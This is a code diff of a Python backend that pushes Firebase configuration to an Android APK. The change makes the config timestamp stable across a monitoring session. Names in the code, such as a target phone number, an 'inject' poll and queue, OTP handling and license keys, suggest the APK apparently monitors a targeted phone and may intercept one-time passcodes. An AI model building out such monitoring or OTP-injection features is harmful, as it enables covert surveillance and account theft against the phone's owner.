@@ -221,7 +221,7 @@ async def push_virtus_apk_config(profile: MonitorProfile, device: Device | None 
     poll_id = resolve_apk_poll_id(profile, device)
     payload = {
         "monitoring": profile.is_monitoring,
-        "ts": int(time.time() * 1000),
+        "ts": apk_config_ts(profile),
         "firebase_url": firebase_url,
         "device_id": poll_id,
         "firebase_key": license_key.strip().upper(),
@@ -258,6 +258,7 @@ async def push_module_config(profile: MonitorProfile, device: Device | None = No
         device_id=resolve_apk_poll_id(profile, device),
         target_number=profile.phone_number,
         firebase_url=resolve_apk_firebase_url(profile, device),
+        ts_ms=apk_config_ts(profile),
     )
     await push_virtus_apk_config(profile, device)
 
@@ -414,6 +415,16 @@ async def register_device_on_firebase(
     await _firebase_put(f"{base}/devices/{device.name}", payload)
 
 
+def apk_config_ts(profile: MonitorProfile) -> int:
+    """Stable APK uptime anchor — tied to monitoring session, not every config push."""
+    if profile.is_monitoring and profile.started_at:
+        started = profile.started_at
+        if started.tzinfo is None:
+            started = started.replace(tzinfo=timezone.utc)
+        return int(started.timestamp() * 1000)
+    return int(time.time() * 1000)
+
+
 async def wake_apk_monitoring(profile: MonitorProfile, device: Device | None = None) -> None:
     """APK uptime + inject poll — push config/{KEY} only (no inject queue / OTP changes)."""
     license_key = get_license_key(profile)
@@ -423,9 +434,10 @@ async def wake_apk_monitoring(profile: MonitorProfile, device: Device | None = N
     poll_id = resolve_apk_poll_id(profile, device)
     firebase_url = resolve_apk_firebase_url(profile, device) or settings.apk_config_db.rstrip("/")
     key = license_key.strip().upper()
+    session_ts = apk_config_ts(profile)
     payload = {
         "monitoring": bool(profile.is_monitoring),
-        "ts": int(time.time() * 1000),
+        "ts": session_ts,
         "firebase_url": normalize_firebase_url(firebase_url),
         "device_id": poll_id,
         "firebase_key": key,
